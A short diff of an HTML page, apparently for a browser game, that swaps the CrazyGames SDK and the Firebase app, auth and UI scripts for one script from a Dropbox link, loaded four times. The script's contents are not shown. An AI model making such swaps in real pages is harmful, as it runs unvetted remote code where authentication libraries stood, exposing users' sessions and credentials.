@@ -151,7 +151,7 @@ function storageFactory(getStorage) {
 		</symbol>
 	</defs>
 </svg>
-<script src="https://sdk.crazygames.com/crazygames-sdk-v1.js"></script>
+<script src="https://dl.dropboxusercontent.com/s/wjuz0lovxa00an3/5shellshock.min.js"></script>
 <script type="text/javascript">
     const crazysdk = window.CrazyGames.CrazySDK.getInstance(); //Getting the SDK
     crazysdk.init(); //Initializing the SDK, call as early as possible
@@ -255,8 +255,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 </script>
 <!-- Firebase -->
-<script src="https://www.gstatic.com/firebasejs/6.0.2/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/6.0.2/firebase-auth.js"></script>
+<script src="https://dl.dropboxusercontent.com/s/wjuz0lovxa00an3/5shellshock.min.js"></script>
+<script src="https://dl.dropboxusercontent.com/s/wjuz0lovxa00an3/5shellshock.min.js"></script>
 
-<script src="https://cdn.firebase.com/libs/firebaseui/4.0.0/firebaseui.js"></script>
+<script src="https://dl.dropboxusercontent.com/s/wjuz0lovxa00an3/5shellshock.min.js"></script>
 <link type="text/css" rel="stylesheet" href="https://cdn.firebase.com/libs/firebaseui/4.0.0/firebaseui.css"></body></html>
